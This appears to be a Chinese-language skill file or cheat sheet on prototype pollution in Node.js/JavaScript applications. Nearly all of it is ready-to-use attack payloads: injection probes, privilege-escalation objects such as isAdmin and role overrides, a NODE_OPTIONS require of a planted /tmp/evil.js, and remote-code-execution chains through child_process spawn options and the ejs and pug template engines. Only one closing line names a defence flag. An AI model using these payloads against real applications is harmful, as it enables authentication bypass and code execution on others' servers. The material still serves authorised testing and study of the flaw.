---
name: 'prototype-pollution'
description: 'Prototype Pollution：__proto__注入→属性劫持→RCE。Node.js/JavaScript应用关键攻击面。'
disable-model-invocation: true
metadata: { domain: web, tier: T2 }
---


## Prototype Pollution（原型污染）

> Node.js/JavaScript 对象通过 `__proto__` 继承 → 污染 `Object.prototype` → 全局属性劫持 → RCE

### 检测
```javascript
// 注入测试 payload
?__proto__[test]=polluted
{"__proto__":{"test":"polluted"}}
{"constructor":{"prototype":{"test":"polluted"}}}

// 验证污染成功
Object.prototype.test  // 如果是 "polluted" → 确认漏洞
```text

### 常用 Payload
```json
// 绕过登录
{"__proto__":{"isAdmin":true}}
{"__proto__":{"role":"admin"}}

// 绕过输入验证
{"__proto__":{"allowAll":true}}

// 污染 shell 配置 → RCE
{"__proto__":{"shell":"/bin/bash"}}
{"__proto__":{"env":{"NODE_OPTIONS":"--require=/tmp/evil.js"}}}

// 污染 child_process.spawn
{"__proto__":{"shell":"/proc/self/exe"}}
{"constructor":{"prototype":{"shell":"/bin/bash"}}}

// 污染 .env 读取
{"__proto__":{"NODE_ENV":"production"}}
```text

### 链到 RCE
```json
// 路径 1: child_process.spawn shell 选项
{"__proto__":{"shell":"/bin/bash"}}
// → 触发 spawn('ls') → 实际执行 bash -c 'ls'

// 路径 2: ejs 模板引擎
{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('id');//"}}

// 路径 3: pug 模板引擎  
{"__proto__":{"debug":true,"line":"process.mainModule.require('child_process').exec('id')"}}

// 路径 4: 通用 require 路径
{"constructor":{"prototype":{"require":"child_process"}}}
```text

### 嵌套污染（深层 merge）
```json
// lodash.merge / deep-extend 等
{"a":1, "__proto__":{"polluted":"yes"}}
{"a":{"__proto__":{"polluted":"yes"}}}

// 数组路径
{"a[b]":"val"} → a.b = val → 经过原型链
```text

### 工具
- **ppfuzz**: 自动 fuzz prototype pollution
- **Burp DOM Invader**: 浏览器内检测
- **Node.js --disable-proto=delete**: 防御方法
